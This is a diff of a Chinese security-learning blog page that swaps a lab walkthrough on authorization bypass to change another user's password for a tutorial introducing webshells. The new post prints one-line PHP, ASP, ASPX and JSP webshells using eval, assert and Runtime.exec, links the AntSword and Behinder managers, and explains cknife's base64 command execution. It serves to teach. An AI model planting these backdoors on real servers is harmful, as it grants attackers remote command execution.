@@ -22,25 +22,28 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="越权操作思路+流程">
+  <meta name="description" content="webshell基本介绍与管理工具介绍">
 <meta property="og:type" content="article">
-<meta property="og:title" content="越权修改密码">
-<meta property="og:url" content="http://example.com/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/index.html">
+<meta property="og:title" content="webshell">
+<meta property="og:url" content="http://example.com/2021/06/23/webshell/index.html">
 <meta property="og:site_name" content="Cyber security">
-<meta property="og:description" content="越权操作思路+流程">
+<meta property="og:description" content="webshell基本介绍与管理工具介绍">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/1.png">
-<meta property="og:image" content="http://example.com/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/2.png">
-<meta property="og:image" content="http://example.com/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/3.png">
-<meta property="article:published_time" content="2021-06-11T10:56:13.000Z">
-<meta property="article:modified_time" content="2021-06-14T05:05:01.790Z">
+<meta property="og:image" content="http://example.com/2021/06/23/webshell/1.png">
+<meta property="og:image" content="http://example.com/2021/06/23/webshell/2.png">
+<meta property="og:image" content="http://example.com/2021/06/23/webshell/3.png">
+<meta property="og:image" content="http://example.com/2021/06/23/webshell/4.png">
+<meta property="og:image" content="http://example.com/2021/06/23/webshell/5.png">
+<meta property="og:image" content="http://example.com/2021/06/23/webshell/6.png">
+<meta property="og:image" content="http://example.com/2021/06/23/webshell/7.png">
+<meta property="article:published_time" content="2021-06-23T09:09:00.000Z">
+<meta property="article:modified_time" content="2021-06-23T12:04:28.265Z">
 <meta property="article:author" content="stupidwolf">
 <meta property="article:tag" content="web安全">
-<meta property="article:tag" content="漏洞靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/1.png">
+<meta name="twitter:image" content="http://example.com/2021/06/23/webshell/1.png">
 
-<link rel="canonical" href="http://example.com/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/">
+<link rel="canonical" href="http://example.com/2021/06/23/webshell/">
 
 
 <script id="page-configurations">
@@ -53,7 +56,7 @@
   };
 </script>
 
-  <title>越权修改密码 | Cyber security</title>
+  <title>webshell | Cyber security</title>
   
 
 
@@ -208,7 +211,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/23/webshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -221,7 +224,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          越权修改密码
+          webshell
         </h1>
 
         <div class="post-meta">
@@ -231,16 +234,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2021-06-11 18:56:13" itemprop="dateCreated datePublished" datetime="2021-06-11T18:56:13+08:00">2021-06-11</time>
+              <time title="创建时间：2021-06-23 17:09:00 / 修改时间：20:04:28" itemprop="dateCreated datePublished" datetime="2021-06-23T17:09:00+08:00">2021-06-23</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-06-14 13:05:01" itemprop="dateModified" datetime="2021-06-14T13:05:01+08:00">2021-06-14</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -251,11 +248,7 @@
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">漏洞靶场练习</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/Webug4-0/" itemprop="url" rel="index"><span itemprop="name">Webug4.0</span></a>
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" itemprop="url" rel="index"><span itemprop="name">文件上传</span></a>
                 </span>
             </span>
 
@@ -265,7 +258,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>538</span>
+              <span>1.3k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -284,42 +277,53 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>越权操作思路+流程</p>
+        <p>webshell基本介绍与管理工具介绍</p>
 <span id="more"></span>
 
-<h1 id="观察页面"><a href="#观察页面" class="headerlink" title="观察页面"></a>观察页面</h1><p>打开靶场观察</p>
-<img src="/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/1.png" alt="1" style="zoom:50%;">
+<h1 id="Webshell基本介绍"><a href="#Webshell基本介绍" class="headerlink" title="Webshell基本介绍"></a>Webshell基本介绍</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>webshell是以asp、php、jsp(Java)等网页文件形式存在的一种命令执行环境，也可以称为一种网页木马后门</p>
+<p>木马：一些程序设计人员在其可从网络上下载的应用程序或游戏中，包含了可以控制用户计算机系统的程序，可能</p>
+<p>​           造成用户的系统被破环甚至瘫痪</p>
+<p>后门：一台计算机上有65535个端口，每个端口是计算机与外界连接所开启 的“门”，每个门都有计算机提供的一些</p>
+<p>​            服务，攻击者利用这些服务， 获取服务器的权限，给自己进入计算机留下一个后门</p>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="根据文件大小分类"><a href="#根据文件大小分类" class="headerlink" title="根据文件大小分类"></a>根据文件大小分类</h3><p>一句话木马：代码简短，通常只有一行代码，使用方便 </p>
+<p>小马：只包含文件上传功能，体积小 </p>
+<p>大马：体积大，包含很多功能，代码通常会进行加密隐藏</p>
+<h3 id="根据文件类型分类"><a href="#根据文件类型分类" class="headerlink" title="根据文件类型分类"></a>根据文件类型分类</h3><p>Jsp(Java)、asp、aspx(.net)、php</p>
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>webshell大多以动态脚本形式出现 </p>
+<p>webshell就是一个asp或php木马后门 </p>
+<p>webshell可以穿越服务器防火墙，攻击者与被控服务器交换数据都是通过80端口传递 </p>
+<p>webshell一般不会在系统日志中留下记录，只会在web日志中留下数据传递记录</p>
+<h2 id="常见Webshell"><a href="#常见Webshell" class="headerlink" title="常见Webshell"></a>常见Webshell</h2><p>PHP：&lt;?php eval($_GET[pass]);? &gt;</p>
+<p> ASP：&lt;%eval request(“pass”)%&gt; </p>
+<p>ASPX：&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”])%&gt; </p>
+<p>JSP：&lt;%Runtime.getRuntime().exec(request.getParameter(“i”));%&gt;</p>
+<h1 id="Webshell基本原理"><a href="#Webshell基本原理" class="headerlink" title="Webshell基本原理"></a>Webshell基本原理</h1><h2 id="可执行脚本"><a href="#可执行脚本" class="headerlink" title="可执行脚本"></a>可执行脚本</h2><p>eval:将字符串按照php代码执行（可将字符串转换为代码执行，并返回一个或多个值）</p>
+<h2 id="数据传递"><a href="#数据传递" class="headerlink" title="数据传递"></a>数据传递</h2><p>HTTP数据包($_GET、$_POST、$_COOKIES)</p>
+<h3 id="GET方式"><a href="#GET方式" class="headerlink" title="GET方式"></a>GET方式</h3><p>&lt; ?php eval($_GET[pass]);? &gt;</p>
+<img src="/2021/06/23/webshell/1.png" alt="1" style="zoom:50%;">
 
-<p>先尝试最常用的：用户名密码均为admin</p>
-<p>登陆成功，提示修改密码</p>
-<img src="/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/2.png" style="zoom:50%;">
+<h3 id="POST方式"><a href="#POST方式" class="headerlink" title="POST方式"></a>POST方式</h3><p>&lt; ?php assert($_POST[pass]);? &gt;</p>
+<img src="/2021/06/23/webshell/2.png" alt="2" style="zoom:50%;">
 
-<p>URL：/control/auth_cross/cross_auth_passwd2.php?id=1</p>
-<p>查看数据库知他有两个账户</p>
-<ul>
-<li>admin    admin </li>
-<li>aaaaa    asdfsadf</li>
-</ul>
-<p>登录第二个账户</p>
-<p>修改界面与admin相同</p>
-<p>URL：control/auth_cross/cross_auth_passwd2.php?id=2</p>
-<p>尝试将id改为1后刷新网页</p>
-<p>URL变为：/control/auth_cross/cross_auth_passwd2.php?id=1</p>
-<p>则此时便可对admin账户进行密码修改操作</p>
-<h1 id="抓取数据包"><a href="#抓取数据包" class="headerlink" title="抓取数据包"></a>抓取数据包</h1><p>根据题目，是要越权修改密码</p>
-<p>打开Burp，抓取admin修改密码时的数据包</p>
-<p>PHPSESSID=7e8a67ea03add4001e3c0723a97321da</p>
-<p>再抓取普通用户修改密码时的数据包</p>
-<p>send to repeater</p>
-<img src="/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/3.png" alt="3" style="zoom:50%;">
+<h3 id="Cookie方式"><a href="#Cookie方式" class="headerlink" title="Cookie方式"></a>Cookie方式</h3><p>&lt; ?php @$a = $_COOKIE[1];@assert($a);? &gt;</p>
+<img src="/2021/06/23/webshell/3.png" alt="3" style="zoom:50%;">
 
-<p>发现admin与普通用户的PHPSESSID相同</p>
-<p>修改：id=1，旧密码为admin旧密码，再修改新密码</p>
-<p>发现修改成功</p>
-<p>若随便输入一个旧密码是否起作用</p>
-<p>修改：id=1，旧密码111（随便输），新密码456</p>
-<p>修改成功</p>
-<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>通过将id值，新密码值随便修改，便可达到越权修改密码的目的</p>
+<h1 id="Webshell管理工具介绍"><a href="#Webshell管理工具介绍" class="headerlink" title="Webshell管理工具介绍"></a>Webshell管理工具介绍</h1><h2 id="中国蚁剑"><a href="#中国蚁剑" class="headerlink" title="中国蚁剑"></a>中国蚁剑</h2><p>AntSword 加载器：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Loader">https://github.com/AntSwordProject/AntSword-Loader</a> </p>
+<p>AntSword 源码：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p>
+<img src="/2021/06/23/webshell/4.png" alt="4" style="zoom:50%;">
+
+<h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><p>下载地址： </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v2.0.1/Behinder_v2.0.1.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v2.0.1/Behinder_v2.0.1.zip</a></p>
+<p> 使用介绍：<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
+<img src="/2021/06/23/webshell/5.png" alt="5" style="zoom:50%;">
+
+<h2 id="执行命令解析"><a href="#执行命令解析" class="headerlink" title="执行命令解析"></a>执行命令解析</h2><img src="/2021/06/23/webshell/6.png" alt="6" style="zoom:50%;">
+
+<p>z2是dir经过cknife的组合再经过base64编码后的结果</p>
+<p>cknife通过eval执行action中的代码，把POST的z1和z2用base64_decode解码， 再把z1和z2组合成$r</p>
+<p>最后用system执行$r，打印执行结果</p>
+<img src="/2021/06/23/webshell/7.png" alt="7" style="zoom:50%;">
+
 
     </div>
 
@@ -345,7 +349,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://example.com/2021/06/11/%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81/" title="越权修改密码">http://example.com/2021/06/11/越权修改密码/</a>
+    <a href="http://example.com/2021/06/23/webshell/" title="webshell">http://example.com/2021/06/23/webshell/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -357,7 +361,6 @@
       <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
-              <a href="/tags/%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/" rel="tag"># 漏洞靶场</a>
           </div>
 
         
@@ -366,12 +369,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2021/06/11/Webug%E5%AE%89%E8%A3%85/" rel="prev" title="Webug安装">
-      <i class="fa fa-chevron-left"></i> Webug安装
+    <a href="/2021/06/22/%E8%B6%8A%E6%9D%83-%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/" rel="prev" title="越权+支付逻辑+条件竞争">
+      <i class="fa fa-chevron-left"></i> 越权+支付逻辑+条件竞争
     </a></div>
       <div class="post-nav-item">
-    <a href="/2021/06/17/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/" rel="next" title="汇编语言基础">
-      汇编语言基础 <i class="fa fa-chevron-right"></i>
+    <a href="/2021/06/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="next" title="文件上传漏洞">
+      文件上传漏洞 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -436,7 +439,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%82%E5%AF%9F%E9%A1%B5%E9%9D%A2"><span class="nav-number">1.</span> <span class="nav-text">观察页面</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%93%E5%8F%96%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="nav-number">2.</span> <span class="nav-text">抓取数据包</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%93%E8%AE%BA"><span class="nav-number">3.</span> <span class="nav-text">结论</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Webshell%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">Webshell基本介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9A%E4%B9%89"><span class="nav-number">1.1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E7%B1%BB"><span class="nav-number">1.2.</span> <span class="nav-text">分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E5%88%86%E7%B1%BB"><span class="nav-number">1.2.1.</span> <span class="nav-text">根据文件大小分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%B9%E6%8D%AE%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="nav-number">1.2.2.</span> <span class="nav-text">根据文件类型分类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%B9%E7%82%B9"><span class="nav-number">1.3.</span> <span class="nav-text">特点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81Webshell"><span class="nav-number">1.4.</span> <span class="nav-text">常见Webshell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Webshell%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">Webshell基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC"><span class="nav-number">2.1.</span> <span class="nav-text">可执行脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92"><span class="nav-number">2.2.</span> <span class="nav-text">数据传递</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET%E6%96%B9%E5%BC%8F"><span class="nav-number">2.2.1.</span> <span class="nav-text">GET方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E6%96%B9%E5%BC%8F"><span class="nav-number">2.2.2.</span> <span class="nav-text">POST方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie%E6%96%B9%E5%BC%8F"><span class="nav-number">2.2.3.</span> <span class="nav-text">Cookie方式</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D"><span class="nav-number">3.</span> <span class="nav-text">Webshell管理工具介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91"><span class="nav-number">3.1.</span> <span class="nav-text">中国蚁剑</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%B0%E8%9D%8E"><span class="nav-number">3.2.</span> <span class="nav-text">冰蝎</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">执行命令解析</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
